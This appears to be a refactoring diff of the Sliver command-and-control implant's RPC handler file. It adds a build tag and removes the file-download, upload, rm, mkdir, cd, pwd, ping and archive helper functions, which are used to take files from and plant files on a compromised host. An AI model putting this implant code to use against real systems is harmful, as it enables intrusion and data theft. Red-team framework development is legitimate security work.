+++ implant/sliver/handlers/generic-rpc-handlers.go
@@ -1,3 +1,5 @@
+// +build windows linux darwin
+
 package handlers
 
 /*
@@ -19,13 +21,7 @@ package handlers
 */
 
 import (
-	"archive/tar"
-	"bytes"
-	"compress/gzip"
-	"errors"
 	"fmt"
-	"io"
-	"io/ioutil"
 	"net"
 	"os/exec"
 	"strings"
@@ -43,7 +39,6 @@ import (
 	// {{end}}
 
 	"os"
-	"path/filepath"
 
 	"github.com/bishopfox/sliver/implant/sliver/netstat"
 	"github.com/bishopfox/sliver/implant/sliver/procdump"
@@ -56,21 +51,9 @@ import (
 	"github.com/golang/protobuf/proto"
 )
 
-func pingHandler(data []byte, resp RPCResponse) {
-	ping := &sliverpb.Ping{}
-	err := proto.Unmarshal(data, ping)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-	// {{if .Config.Debug}}
-	log.Printf("ping id = %d", ping.Nonce)
-	// {{end}}
-	data, err = proto.Marshal(ping)
-	resp(data, err)
-}
+// ------------------------------------------------------------------------------------------
+// These are generic handlers (as in calling convention) that use platform specific code
+// ------------------------------------------------------------------------------------------
 
 func psHandler(data []byte, resp RPCResponse) {
 	psListReq := &sliverpb.PsReq{}
@@ -134,255 +117,6 @@ func terminateHandler(data []byte, resp RPCResponse) {
 			Err: errStr,
 		},
 	})
-	resp(data, err)
-}
-
-func dirListHandler(data []byte, resp RPCResponse) {
-	dirListReq := &sliverpb.LsReq{}
-	err := proto.Unmarshal(data, dirListReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-	dir, files, err := getDirList(dirListReq.Path)
-
-	// Convert directory listing to protobuf
-	dirList := &sliverpb.Ls{Path: dir}
-	if err == nil {
-		dirList.Exists = true
-	} else {
-		dirList.Exists = false
-	}
-	dirList.Files = []*sliverpb.FileInfo{}
-	for _, fileInfo := range files {
-		dirList.Files = append(dirList.Files, &sliverpb.FileInfo{
-			Name:  fileInfo.Name(),
-			IsDir: fileInfo.IsDir(),
-			Size:  fileInfo.Size(),
-		})
-	}
-
-	// Send back the response
-	data, err = proto.Marshal(dirList)
-	resp(data, err)
-}
-
-func getDirList(target string) (string, []os.FileInfo, error) {
-	dir, _ := filepath.Abs(target)
-	if _, err := os.Stat(dir); !os.IsNotExist(err) {
-		files, err := ioutil.ReadDir(dir)
-		return dir, files, err
-	}
-	return dir, []os.FileInfo{}, errors.New("Directory does not exist")
-}
-
-func rmHandler(data []byte, resp RPCResponse) {
-	rmReq := &sliverpb.RmReq{}
-	err := proto.Unmarshal(data, rmReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-
-	rm := &sliverpb.Rm{}
-	target, _ := filepath.Abs(rmReq.Path)
-	rm.Path = target
-	_, err = os.Stat(target)
-	if err == nil {
-		if (target == "/" || target == "C:\\") && !rmReq.Force {
-			err = errors.New("Cowardly refusing to remove volume root without force")
-		}
-	}
-
-	rm.Response = &commonpb.Response{}
-	if err == nil {
-		if rmReq.Recursive {
-			err = os.RemoveAll(target)
-			if err != nil {
-				rm.Response.Err = err.Error()
-			}
-		} else {
-			err = os.Remove(target)
-			if err != nil {
-				rm.Response.Err = err.Error()
-			}
-		}
-	} else {
-		rm.Response.Err = err.Error()
-	}
-
-	data, err = proto.Marshal(rm)
-	resp(data, err)
-}
-
-func mkdirHandler(data []byte, resp RPCResponse) {
-	mkdirReq := &sliverpb.MkdirReq{}
-	err := proto.Unmarshal(data, mkdirReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-
-	mkdir := &sliverpb.Mkdir{}
-	target, _ := filepath.Abs(mkdirReq.Path)
-	mkdir.Path = target
-
-	err = os.MkdirAll(target, 0700)
-	if err != nil {
-		mkdir.Response = &commonpb.Response{
-			Err: err.Error(),
-		}
-	}
-	data, err = proto.Marshal(mkdir)
-	resp(data, err)
-}
-
-func cdHandler(data []byte, resp RPCResponse) {
-	cdReq := &sliverpb.CdReq{}
-	err := proto.Unmarshal(data, cdReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		resp([]byte{}, err)
-		return
-	}
-
-	os.Chdir(cdReq.Path)
-	dir, err := os.Getwd()
-	pwd := &sliverpb.Pwd{Path: dir}
-	if err != nil {
-		resp([]byte{}, err)
-		return
-	}
-
-	// {{if .Config.Debug}}
-	log.Printf("cd '%s' -> %s", cdReq.Path, dir)
-	// {{end}}
-
-	data, err = proto.Marshal(pwd)
-	resp(data, err)
-}
-
-func pwdHandler(data []byte, resp RPCResponse) {
-	pwdReq := &sliverpb.PwdReq{}
-	err := proto.Unmarshal(data, pwdReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		resp([]byte{}, err)
-		return
-	}
-
-	dir, err := os.Getwd()
-	pwd := &sliverpb.Pwd{Path: dir}
-	if err != nil {
-		pwd.Response = &commonpb.Response{
-			Err: err.Error(),
-		}
-	}
-
-	data, err = proto.Marshal(pwd)
-	resp(data, err)
-}
-
-// Send a file back to the hive
-func downloadHandler(data []byte, resp RPCResponse) {
-	var rawData []byte
-	downloadReq := &sliverpb.DownloadReq{}
-	err := proto.Unmarshal(data, downloadReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		resp([]byte{}, err)
-		return
-	}
-	target, _ := filepath.Abs(downloadReq.Path)
-	fi, err := os.Stat(target)
-	if err != nil {
-		//{{if .Config.Debug}}
-		log.Printf("stat failed on %s: %v", target, err)
-		//{{end}}
-		download := &sliverpb.Download{Path: target, Exists: false}
-		download.Response = &commonpb.Response{
-			Err: err.Error(),
-		}
-		data, err = proto.Marshal(download)
-		resp(data, err)
-		return
-	}
-	if fi.IsDir() {
-		var dirData bytes.Buffer
-		err = compressDir(target, &dirData)
-		// {{if .Config.Debug}}
-		log.Printf("error creating the archive: %v", err)
-		// {{end}}
-		rawData = dirData.Bytes()
-	} else {
-		rawData, err = ioutil.ReadFile(target)
-	}
-
-	var download *sliverpb.Download
-	if err == nil {
-		gzipData := bytes.NewBuffer([]byte{})
-		gzipWrite(gzipData, rawData)
-		download = &sliverpb.Download{
-			Path:    target,
-			Data:    gzipData.Bytes(),
-			Encoder: "gzip",
-			Exists:  true,
-		}
-	} else {
-		download = &sliverpb.Download{Path: target, Exists: false}
-		download.Response = &commonpb.Response{
-			Err: fmt.Sprintf("%v", err),
-		}
-	}
-
-	data, _ = proto.Marshal(download)
-	resp(data, err)
-}
-
-func uploadHandler(data []byte, resp RPCResponse) {
-	uploadReq := &sliverpb.UploadReq{}
-	err := proto.Unmarshal(data, uploadReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		resp([]byte{}, err)
-		return
-	}
-
-	uploadPath, _ := filepath.Abs(uploadReq.Path)
-	upload := &sliverpb.Upload{Path: uploadPath}
-	f, err := os.Create(uploadPath)
-	if err != nil {
-		upload.Response = &commonpb.Response{
-			Err: fmt.Sprintf("%v", err),
-		}
-
-	} else {
-		defer f.Close()
-		data, err := gzipRead(uploadReq.Data)
-		if err != nil {
-			upload.Response = &commonpb.Response{
-				Err: fmt.Sprintf("%v", err),
-			}
-		} else {
-			f.Write(data)
-		}
-	}
-
-	data, _ = proto.Marshal(upload)
 	resp(data, err)
 }
 
@@ -659,73 +393,6 @@ func getEnvHandler(data []byte, resp RPCResponse) {
 	envInfo.Variables = envVars
 	data, err = proto.Marshal(&envInfo)
 	resp(data, err)
-}
-
-// ---------------- Data Encoders ----------------
-
-func gzipWrite(w io.Writer, data []byte) error {
-	gw, err := gzip.NewWriterLevel(w, gzip.BestSpeed)
-	defer gw.Close()
-	gw.Write(data)
-	return err
-}
-
-func gzipRead(data []byte) ([]byte, error) {
-	bytes.NewReader(data)
-	reader, _ := gzip.NewReader(bytes.NewReader(data))
-	var buf bytes.Buffer
-	_, err := buf.ReadFrom(reader)
-	if err != nil {
-		return nil, err
-	}
-	return buf.Bytes(), nil
-}
-
-func compressDir(path string, buf io.Writer) error {
-	zipWriter := gzip.NewWriter(buf)
-	tarWriter := tar.NewWriter(zipWriter)
-
-	filepath.Walk(path, func(file string, fi os.FileInfo, err error) error {
-		fileName := file
-		// If the file is a SymLink replace fileInfo and path with the symlink destination.
-		if fi.Mode()&os.ModeSymlink == os.ModeSymlink {
-			file, err = filepath.EvalSymlinks(file)
-			if err != nil {
-				return err
-			}
-
-			fi, err = os.Lstat(file)
-			if err != nil {
-				return err
-			}
-		}
-		header, err := tar.FileInfoHeader(fi, file)
-		if err != nil {
-			return err
-		}
-		// Keep the symlink file path for the header name.
-		header.Name = filepath.ToSlash(fileName)
-		if err := tarWriter.WriteHeader(header); err != nil {
-			return err
-		}
-		if !fi.IsDir() {
-			data, err := os.Open(file)
-			if err != nil {
-				return err
-			}
-			if _, err := io.Copy(tarWriter, data); err != nil {
-				return err
-			}
-		}
-		return nil
-	})
-	if err := tarWriter.Close(); err != nil {
-		return err
-	}
-	if err := zipWriter.Close(); err != nil {
-		return err
-	}
-	return nil
 }
 
 func buildEntries(proto string, s []netstat.SockTabEntry) []*sliverpb.SockTabEntry {
